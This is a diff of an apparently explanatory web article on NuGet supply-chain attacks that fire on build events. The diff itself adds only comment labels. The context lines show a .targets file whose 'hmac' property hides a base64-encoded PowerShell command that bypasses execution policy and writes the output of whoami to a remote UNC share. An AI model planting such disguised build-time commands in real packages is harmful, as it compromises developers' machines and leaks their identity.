@@ -113,6 +113,7 @@ So the attack now triggers upon a build event - which in the case of restoring a
 
 <pre>
     <code>
+     <i>&lt;!-- .nuspec --&gt;</i>
     &lt;?xml version=&quot;1.0&quot;?&gt;
     &lt;package &gt;
         &lt;metadata minClientVersion=&quot;2.5&quot;&gt;
@@ -131,6 +132,7 @@ So the attack now triggers upon a build event - which in the case of restoring a
 
 <pre>
     <code>
+     <i>&lt;!-- Example .targets file--&gt;</i>
     &lt;Project&gt;
       &lt;PropertyGroup&gt;   
         &lt;hmac&gt;cG93ZXJzaGVsbCAtTm9Qcm9maWxlIOKAk0V4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIiR1c2VyID0gJiB3aG9hbWk7QWRkLUNvbnRlbnQgLy9HUjA1OTYxOS9sb2cvbG9nLnR4dCAkdXNlciIK&lt;/hmac&gt;    
